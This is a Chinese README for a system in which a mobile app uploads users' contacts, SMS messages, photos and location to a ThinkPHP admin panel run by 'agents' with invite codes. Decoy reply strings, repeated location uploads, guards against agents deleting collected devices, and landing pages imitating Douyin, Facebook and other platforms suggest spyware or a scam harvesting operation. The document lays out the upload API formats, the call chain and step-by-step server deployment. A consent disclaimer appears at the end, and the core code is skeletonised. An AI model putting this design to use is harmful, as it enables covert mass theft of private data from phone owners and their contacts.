# 奥贝通讯 · 设备数据上报与后台管理系统

> 一套「Android App 采集 → HTTP 上报 → ThinkPHP 后台查看 / 管理」的设备数据上报系统。
> App 端在用户授权后采集**通讯录、短信、相册、定位、设备信息**，通过 6 个 POST 接口上报到服务端；
> 服务端落库后，由 ThinkPHP 5.0 后台按设备 / 代理维度查看、导出与维护。

- 站点域名（示例）：`cartier.us.cc`
- 站点根目录：`/www/wwwroot/cartier.us.cc/`，**docroot = `public/`**
- 框架：ThinkPHP **5.0.24**（`TPLAY_VERSION 1.3.3` 后台脚手架）

---

## 一、本仓库包含什么 / 不包含什么 ⚠️

### ✅ 包含

| 内容 | 说明 |
|---|---|
| 完整的**目录结构** | 所有目录层级保留，空目录用 `.gitkeep` 占位，可直接对照线上部署 |
| ThinkPHP 5.0.24 **框架本体** | `thinkphp/`，未做任何改动 |
| **Composer 依赖** | `vendor/`（topthink、phpmailer 等）与 `extend/`（PHPExcel、大鱼短信 SDK、databackup） |
| **第三方前端库** | `public/static/public/` 下的 layui 2.2.5、jQuery、ECharts、font-awesome、ueditor、leaflet 等 |
| **目录与文件职责说明** | 见本文件第四节 |
| **App 接口清单与调用约定** | 6 个接口的方法 / 参数 / 返回串，见第五节 |
| **数据库表结构** | 表名 + 字段清单，见 `deploy/schema.sql`（**仅结构，无任何数据**） |
| **部署步骤** | 见第六节 |
| **后台账号与角色说明** | 见第七节 |
| **运维说明**（备份脚本、演示页、静态资源版本号） | 见第八节 |
| **技术文档** | `docs/` 目录：APK 逆向接口清单、真实 IP 还原报告、核心文件清单 |

### ❌ 不包含（以**骨架 / 占位**形式存在）

> 本仓库是一个**公开**仓库，因此**核心业务实现已全部替换为骨架**：
> 只保留类名、函数名与**方法签名**，方法体统一为一行占位注释。
> 完整版实现**不在本仓库内**，清单见 [`docs/CORE_FILES.md`](docs/CORE_FILES.md)。

| 被骨架化的内容 | 位置 |
|---|---|
| App 上报接口的全部落库逻辑 | `app/api/controller/Uploads.php` |
| 后台全部控制器逻辑 | `app/admin/controller/*.php` |
| 后台公共函数（密码加盐、操作日志、代理删保护） | `app/admin/common.php` |
| 后台全部视图模板 | `app/admin/view/**/*.html`（40 个） |
| 演示页 | `public/demo/*.html`（8 个） |
| 自研样式与脚本 | `public/static/admin/css/{skin,flat,cc-back,admin,dingwei}.css`、`public/static/admin/js/cc-return.js`、`public/static/js/dingwei.js` |

同时以下内容**因体积或隐私原因未入库**（详见第三节排除清单）：
用户上传目录 `public/uploads/`、安装包 `public/dl/*.apk` 与 `*.ipa`、登录页背景视频 `*.mp4`、运行时目录 `runtime/`。

---

## 二、技术栈

| 层次 | 选型 | 备注 |
|---|---|---|
| 后端框架 | **ThinkPHP 5.0.24** | `thinkphp/`，`public/index.php` 为唯一入口 |
| 运行环境 | **PHP 7.3**（线上实际已验证 PHP 8.1 亦可运行） | 需 `pdo_mysql`、`gd`、`fileinfo`、`openssl`、`mbstring` |
| 数据库 | **MySQL 5.7** | 表前缀 `app_`，连接端口示例 `3307` |
| Web 服务器 | **Nginx 1.24** | 伪静态 `rewrite ^(.*)$ /index.php?s=$1 last;` |
| 后台 UI | **layui 2.2.5** + 自研扁平化皮肤 `flat.css` | `skin.css` 为皮肤基础，`flat.css` 为其上的扁平化覆盖层 |
| 前端其他库 | jQuery / ECharts / font-awesome / ueditor / leaflet | 地图页使用 leaflet |
| 扩展类库 | PHPExcel（导出 Excel）、大鱼（阿里云）短信 SDK、`databackup`（数据库备份） | 位于 `extend/` |
| App 端 | uni-app（DCloud）打包的 Android/iOS 客户端 | 逆向分析见 [`docs/APK_INTERFACES.md`](docs/APK_INTERFACES.md) |

---

## 三、目录结构

```
tongxlu/
├── app/                        ThinkPHP 应用目录（业务代码）
│   ├── admin/                  后台模块
│   │   ├── common.php          ★ 后台公共函数（密码加盐 / 操作日志 / 代理删保护）【骨架】
│   │   ├── config.php          后台模块配置
│   │   ├── controller/         ★ 后台控制器（Admin / Appv1 / Main / Permissions ...）【骨架】
│   │   ├── model/              后台模型（Admin / AdminMenu / Article ...）
│   │   └── view/               ★ 后台视图模板，按控制器分目录（appv1 / main / public ...）【骨架】
│   ├── api/                    App 接口模块
│   │   └── controller/
│   │       └── Uploads.php     ★ App 端 6 个上报接口【骨架】
│   ├── index/                  前台入口模块（Index 控制器）
│   ├── common.php              公共函数（发信 / 发短信 / 号码隐藏 / 取链接）
│   ├── config.php              应用全局配置
│   ├── database.php            ★ 数据库配置（口令已替换为占位符）
│   ├── route.php  tags.php  command.php  Layuipaginate.php
├── deploy/                     部署参考（新增）
│   ├── nginx.conf.example      Nginx 站点配置样例（含 TP5 伪静态、敏感文件拦截）
│   ├── backup_cartier.sh       每日备份脚本（已脱敏）
│   └── schema.sql              数据库表结构（仅结构，18 张表，无数据）
├── docs/                       技术文档（新增）
│   ├── CORE_FILES.md           ★ 被骨架化的文件清单 + 接口协议
│   ├── APK_INTERFACES.md       App 安装包逆向出的接口清单与能力判定
│   └── REALIP_REPORT.md        Cloudflare 真实访客 IP 还原的部署与验证报告
├── extend/                     扩展类库（composer 之外的第三方库）
│   ├── PHPExcel/               Excel 读写（后台导出用）
│   ├── dayu/                   大鱼 / 阿里云短信 SDK（含示例文件，密钥已占位）
│   └── databackup/             数据库备份还原组件
├── thinkphp/                   ThinkPHP 5.0.24 框架本体（未改动）
├── vendor/                     Composer 依赖（topthink / phpmailer / phpunit ...）
├── public/                     ★ 网站根目录（Nginx docroot 指向这里）
│   ├── index.php               应用入口文件（定义 APP_PATH / EXTEND_PATH / VENDOR_PATH）
│   ├── router.php              内置服务器路由脚本
│   ├── .htaccess  robots.txt  1.txt  json.bat
│   ├── 404.html  favicon.ico
│   ├── static/                 前端静态资源
│   │   ├── admin/              ★ 后台皮肤：css/{skin.css,flat.css,...}、js/、images/
│   │   ├── js/                 ★ 自研脚本：dingwei.js（定位地图页）、qrcode.min.js
│   │   ├── leaflet/            地图库
│   │   ├── login/              登录页素材（背景视频未入库）
│   │   └── public/             第三方库：layui / jquery / echarts / font-awesome / ueditor / sideshow
 
│   ├── demo/                   ★ 演示页（animation / douyin / facebook / kuaishou / release / sms / takeover / youtube）【骨架】
│   ├── dl/                     App 下载页（index.html / go.html / manifest.plist / version.json；apk、ipa 未入库）
│   ├── web/                    H5 结果页（list.html「数据已上报成功」）
│   ├── ueditor/                UEditor 服务端（php）
│   ├── Data/                   备份锁文件目录（运行时生成）
│   └── uploads/                用户上传目录（相册 / 附件）—— ★ 含隐私，未入库，仅保留目录占位
├── runtime/                    ThinkPHP 运行时（缓存/日志）—— 未入库，仅保留目录占位
├── .gitignore
├── .htaccess
├── 404.html
└── index.html
```

带 ★ 的是需要重点关注的目录 / 文件。

### 关键文件速查

| 路径 | 职责 |
|---|---|
| `app/admin/controller/` | 后台全部业务控制器；`Permissions.php` 是权限基类，其余控制器都 `extends Permissions` |
| `app/admin/view/` | 后台视图；`appv1/` 是设备业务页（定位、相册、通讯录、短信、用户、设置） |
| `app/api/controller/Uploads.php` | App 端 6 个上报接口的唯一入口 |
| `public/demo/` | 演示页，可直接替换成自己的落地页 |
| `public/static/admin/css/skin.css` | 后台皮肤基础样式（配色 / 布局 / 组件） |
| `public/static/admin/css/flat.css` | 扁平化覆盖层，**必须加载在 skin.css 之后**才能压过原规则 |
| `public/static/js/dingwei.js` | 后台定位地图页脚本（leaflet） |

---

## 四、App 接口清单

- 基址：`https://<你的域名>/api/`
- 6 个接口**全部为 POST**，请求头 `Content-Type: application/x-www-form-urlencoded`（`img` 为 `multipart/form-data`）
- 路由：`/api/uploads/<方法名>` → `app\api\controller\Uploads::<方法名>()`
- 返回值：除 `getuserid` 外均为**纯文本**（App 端不解析，只写日志）

| # | 路径 | 方法 | 参数 | 返回 |
|---|---|---|---|---|
| 1 | `/api/uploads/api` | POST | `data` = `<手机号>**<邀请码>**<厂商>_<通讯录数>_<相册数>_<短信数>_v108`，其后对每条联系人追加 `=<姓名>\|<号码>`<br>例：`13900000001**589056**HUAWEI_128_51_20_v108=张三\|13900000002` | 文本：`正在加载列表` / `获取失败` / `数据连接错误` / `暂时无法登录，请稍候再试` / `邀请码错误，请联系渠道商` / `重复号码，请换号码进行登录` |
| 2 | `/api/uploads/getuserid` | POST | `mobile` = 手机号 | JSON：`{"code":1,"data":<app_user.id>,"mobile":"..."}`；未注册返回 `{"code":0,"msg":"未注册"}` |
| 3 | `/api/uploads/apisms` | POST | `data` = JSON 数组字符串，**首元素是身份头** `{"imei":"手机号","imei2":"邀请码"}`，其后每条短信 `{"Smsbody":正文,"PhoneNumber":对方号码,"Date":"Y-M-D H:M:S","Type":类型}`，最多 50 条 | 文本：`获取成功` / `获取失败` / `获取信息错误`（短信条数为 0 时数组长度 < 2，返回此串） |
| 4 | `/api/uploads/img` | POST<br>multipart | 文件字段 `data`（兼容 `file/upload/image/img/photo`）；表单字段 `id` = `app_user.id` | 文本：`ok`；失败为一句中文（如 `缺少id参数` / `用户不存在` / `未收到文件` / `图片超过20MB` / `不是支持的图片格式` / `该设备相册数量已达上限` / `保存失败`） |
| 5 | `/api/uploads/apimap` | POST | `data` = `<手机号>,<邀请码>,<经度>,<纬度>` | 文本：`获取成功` / `获取失败` |
| 6 | `/api/uploads/diag` | POST | `d` = JSON，`{"tag":"阶段名","lxr":通讯录数,"sms":短信数,"img":相册数,"brand":厂商,"model":机型,"android":系统版本}` | JSON 自检信息（PHP 版本、DB 连接、相册目录、上传限制、日志尾部） |

### 调用链（App 端实际行为）

```
用户输入 手机号 + 邀请码 → 点「注册」
  └─ 申请权限 + 读通讯录 / 短信 / 相册（期间 13 次调用 /api/uploads/diag 埋点）
       └─ POST /api/uploads/api          （注册 + 通讯录落 app_mobile）
            ├─ POST /api/uploads/apisms  （短信落 app_content）
            └─ POST /api/uploads/getuserid
                 └─ code==1 时：
                      ├─ 每张图片 POST /api/uploads/img     （落 public/uploads/album/<id>/）
                      └─ POST /api/uploads/apimap          （立即 1 次，之后每 60s 重试直到成功）
```

### 落库对应关系

| 接口 | 目标表 | 关键字段 |
|---|---|---|
| `api` | `app_user` | `name`(手机号)、`code`(邀请码)、`clientid`(厂商_数量)、`ip`、`ipdizhi`、`login_time` |
| `api` | `app_mobile` | `userid`、`username`(姓名)、`umobile`(号码)、`addtime` |
| `apisms` | `app_content` | `userid`、`smscontent`、`smstel`、`smstime`、`type`、`addtime` |
| `getuserid` | `app_user` | 按 `name` 查 `id` 返回 |
| `img` | 文件系统 | `public/uploads/album/<app_user.id>/`，单设备有数量上限 |
| `apimap` | `app_user` | 更新 `mapx`(经度)、`mapy`(纬度) |

> 完整表结构见 [`deploy/schema.sql`](deploy/schema.sql)（18 张表，仅结构无数据）。
> 详细的参数拼装原文、客户端能力判定（有 / 无哪些采集能力）见 [`docs/APK_INTERFACES.md`](docs/APK_INTERFACES.md)。

---

## 五、后台账号与角色

后台入口：`/admin_login.shtml`（或 `/admin/common/login`）

### 角色分组（表 `app_admin_cate`）

| cate id | 名称 | 权限范围 |
|---|---|---|
| **1** | **超级管理员** | 全部菜单与操作（最高权限） |
| **21** | **代理** | 仅被授权的菜单子集；**受"代理禁删"规则限制** |

管理员账号表 `app_admin`，关键字段：`name`（登录名）、`password`（加盐 MD5）、`admin_cate_id`（角色）、`is_2fa_enabled` / `google_secret`（可选两步验证）。

### 密码存储

```
password($password, $password_code) = md5( md5($password) . md5($password_code) )
```

- 实现位于 `app/admin/common.php` 的 `password()` 函数。
- `$password_code` 是**全局密码盐值**，本仓库中已替换为占位符 `YOUR_PASSWORD_SALT`。
- ⚠️ **部署时必须填真实盐值**，且必须与数据库中既有密码的盐值一致，否则所有历史密码都会失效。

### 代理禁删规则

- 由 `app/admin/common.php` 中的 `agent_delete_guard()` 与 `agent_is_delete_action($controller, $action)` 实现，
  在权限基类 `Permissions` 初始化时统一挂载。
- 语义：当登录账号的角色是**代理（cate = 21）**时，命中"删除类"动作（`delete` / `*delete` / `alldeletes` / `clearuser` / `clearsms` 等）会被拦截，
  避免代理误删或恶意删除自己名下的设备与数据；超管（cate = 1）不受此限制。
- ⚠️ 具体实现已骨架化，完整逻辑见本机备份 `repo/_full_backup/app/admin/common.php`。

### 邀请码策略（宽松）

`/api/uploads/api` 的校验逻辑是：

```php
if ($appconfig['yaoqingma'] != $aaa[1] && isset($appconfig['yaoqingma']) && !empty($appconfig['yaoqingma'])) {
    exit('邀请码错误，请联系渠道商');
}
```

即：**只有在后台把邀请码配置成"非空"时才会真正校验**；
若 `app_appconfig.yaoqingma` 为空，则**任意邀请码都能通过**（宽松策略）。
是否开启由 `app_appconfig.is_yaoqingma` 与 `yaoqingma` 字段控制，
后台「App 设置」页可切换（`app/admin/controller/Appv1.php::appset()`）。

---

## 六、部署步骤

### 1. 环境要求

| 项 | 要求 |
|---|---|
| PHP | 7.3（推荐）/ 8.1 亦可；扩展：`pdo_mysql` `mbstring` `gd` `fileinfo` `openssl` `curl` |
| MySQL | 5.7 |
| Nginx | 1.20+ |
| 磁盘 | 建议 ≥ 20GB（相册图片持续增长） |

**PHP 上传限制**（App 相册单张最大 20MB，必须放开）：

```ini
upload_max_filesize = 24M
post_max_size       = 32M
max_execution_time  = 300
memory_limit        = 256M
```

Nginx 侧同步设置 `client_max_body_size 32m;`

### 2. 建库并导入表结构

```bash
mysql -uroot -p -e "CREATE DATABASE cartier DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;"

# 创建业务账号（口令自行替换）
mysql -uroot -p -e "CREATE USER 'cartier'@'127.0.0.1' IDENTIFIED BY '你的库口令'; \
                    GRANT ALL PRIVILEGES ON cartier.* TO 'cartier'@'127.0.0.1'; FLUSH PRIVILEGES;"

# 导入表结构（deploy/schema.sql 仅含结构，18 张表）
mysql -uroot -p cartier < deploy/schema.sql
```

> `deploy/schema.sql` 只有 `CREATE TABLE`，**不含任何业务数据**。
> 首次部署后需要手工插入一个超管账号（`app_admin`，`admin_cate_id = 1`），
> 密码字段填 `md5(md5('你的密码') . md5('你的盐值'))`。

### 3. 配置数据库连接（★ 必做）

编辑 `app/database.php`，把占位符换成真实值：

```php
'hostname' => '127.0.0.1',
'database' => 'cartier',
'username' => 'cartier',
'password' => 'YOUR_DB_PASSWORD',   // ← 改成真实库口令
'hostport' => '3307',               // ← 改成实际端口
'prefix'   => 'app_',
```

### 4. 配置密码盐值（★ 必做）

编辑 `app/admin/common.php`，把占位符换成真实盐值：

```php
function password($password, $password_code='YOUR_PASSWORD_SALT')  // ← 改成真实盐值
```

### 5. 配置 Nginx

- **站点根目录必须指向 `public/`**
- 伪静态规则：

```nginx
if (!-e $request_filename) {
    rewrite ^(.*)$ /index.php?s=$1 last;
}
```

完整样例见 [`deploy/nginx.conf.example`](deploy/nginx.conf.example)。

### 6. 目录权限

```bash
chown -R www:www /www/wwwroot/cartier.us.cc
chmod -R 755 /www/wwwroot/cartier.us.cc
# 以下目录必须可写
chmod -R 777 /www/wwwroot/cartier.us.cc/runtime
chmod -R 777 /www/wwwroot/cartier.us.cc/public/uploads
```

### 7. 需要自行补齐的资源（未入库）

| 路径 | 说明 |
|---|---|
| `public/uploads/` | 用户上传目录，**空目录占位**，部署后需可写 |
| `public/static/login/bg.mp4`、`public/static/public/login/bg.mp4` | 登录页背景视频（各约 9MB），未入库；缺失时页面回退到 `poster.jpg` |
| `public/dl/*.apk`、`public/dl/*.ipa` | App 安装包，未入库，请自行放入并在 `version.json` 中更新版本号 |

### 8. 验证

| 检查 | 期望 |
|---|---|
| 访问 `/` | 200 |
| 访问 `/admin_login.shtml` | 200，出现登录页 |
| `POST /api/uploads/diag` | 返回 JSON 自检信息 |
| `runtime/log/` | 无 `[ error ]` |

---

## 七、运维说明

### 每日备份 `deploy/backup_cartier.sh`

备份**数据库全量 + 自定义代码 + 用户上传（相册）+ Nginx 配置**，
输出到 `/www/backup/cartier/{db,files}/`，**保留最近 14 天**（`KEEP=14`，由 `find -mtime +14 -delete` 清理），
日志写在 `/www/backup/cartier/backup.log`。

```bash
export MYSQL_PWD='你的数据库口令'     # 口令不入库，用环境变量传入
bash deploy/backup_cartier.sh
# 建议 crontab： 30 3 * * * /bin/bash /root/backup_cartier.sh
```

### 演示页 `public/demo/*.html`

`public/demo/` 下的 8 个 HTML（`animation` / `douyin` / `facebook` / `kuaishou` / `release` / `sms` / `takeover` / `youtube`）
是**可随时替换的演示落地页**：直接覆盖同名文件即可生效，不需要改任何后端代码。
本仓库中它们是骨架版（只保留 `<!DOCTYPE html>` 与 `window.__CC_DEMO_READY__ = true;`）。

### 静态资源版本号机制（`?v=`）

后台模板引用样式时统一带版本号：

```html
<link rel="stylesheet" href="__CSS__/skin.css?v=20260922d" />
<link rel="stylesheet" href="__CSS__/flat.css?v=20260922d" />
```

- 目的：Nginx 对 `js|css` 设了 `expires 12h`，**改了样式但浏览器仍用旧缓存**是常见坑；
  带 `?v=` 后只要把版本号改一次，所有客户端立即拉新文件。
- 用法：**每次改动 `skin.css` / `flat.css` / `dingwei.js` 后，把 `app/admin/view/public/header.html`、
  `foot.html` 等模板里的 `?v=` 值统一改成一个新的字符串**（例如日期 + 序号）。
- 注意：`flat.css` 是覆盖层，**必须排在 `skin.css` 之后**，否则扁平化规则会被压掉。
- 模板里的 `__CSS__` / `__JS__` 是 ThinkPHP 模板常量，指向 `public/static/...`。

### 运行时目录

`runtime/` 存放编译缓存与日志（`runtime/log/YYYYMM/`、`runtime/cache/`、`runtime/temp/`），
**不入库**，部署后需可写；排查问题优先看 `runtime/log/`。

---

## 八、安全须知 🔒

1. **本仓库已脱敏。** 以下值在本仓库中**全部是占位符**，**部署前必须填入真实值**：

   | 文件 | 占位符 | 说明 |
   |---|---|---|
   | `app/database.php` | `YOUR_DB_PASSWORD` | 数据库口令 |
   | `app/admin/common.php` | `YOUR_PASSWORD_SALT` | 登录密码盐值（`$password_code`） |
   | `extend/dayu/test.php`、`extend/dayu/fileTest.php` | `YOUR_ALIYUN_APP_KEY` / `YOUR_ALIYUN_APP_SECRET` / `YOUR_ALIYUN_ACCESS_TOKEN` | 短信 SDK 示例文件中的密钥 |

   真实口令与盐值**只存在于线上服务器与本机备份**，从未提交进本仓库。

2. **`public/uploads/` 不入库。** 该目录存放 App 上报的**真实用户相册照片**，
   属于个人隐私数据，因此整个目录被排除、仅保留空目录占位，并被 `.gitignore` 忽略。
   同理 `runtime/`、`*.log` 也不入库（日志里可能含手机号、IP 等个人信息）。

3. **`.gitignore` 已覆盖**：`runtime/`、`public/uploads/`、`*.log`、`*.apk`、`*.ipa`、`*.mp4`、
   `.user.ini`、`.idea/`、`.vscode/`、`_full_backup/`。
   提交前请务必 `git status` 确认没有把隐私文件带进来。

4. **App 采集的是敏感个人信息**（通讯录、短信、相册、定位）。
   部署与使用该系统必须遵守所在地法律法规（《个人信息保护法》《网络安全法》等），
   必须取得用户的**明示同意**，并做最小必要采集。**请勿用于任何未经授权的用途。**

5. **上线前建议加固**：
   - 后台强制 HTTPS，并开启 `app_admin.is_2fa_enabled`（两步验证）；
   - Nginx 屏蔽 `.git`、`runtime`、`*.sql`、`*.md` 等敏感路径（见 `deploy/nginx.conf.example`）；
   - 数据库账号只授予 `cartier` 库权限，禁止 `root` 直连业务；
   - `app/database.php` 的 `'debug' => true` 在生产环境建议改为 `false`；
   - 定期轮换数据库口令与密码盐值。

---

## 九、文档索引

| 文档 | 内容 |
|---|---|
| [`docs/CORE_FILES.md`](docs/CORE_FILES.md) | **被骨架化的文件清单**（路径 / 行数 / 字节数 / 职责）+ 接口协议 |
| [`docs/APK_INTERFACES.md`](docs/APK_INTERFACES.md) | App 安装包逆向：6 个接口的原文拼装、能力有无判定、调用链 |
| [`docs/REALIP_REPORT.md`](docs/REALIP_REPORT.md) | Cloudflare 真实访客 IP 还原的部署与验证报告 |
| [`deploy/nginx.conf.example`](deploy/nginx.conf.example) | Nginx 站点配置样例 |
| [`deploy/backup_cartier.sh`](deploy/backup_cartier.sh) | 每日备份脚本（已脱敏） |
| [`deploy/schema.sql`](deploy/schema.sql) | 数据库表结构（仅结构） |

---

## 十、许可与声明

本项目仅供**技术学习与自有业务部署**使用。
使用者需自行确保其使用场景合法合规，并自行承担相应责任。
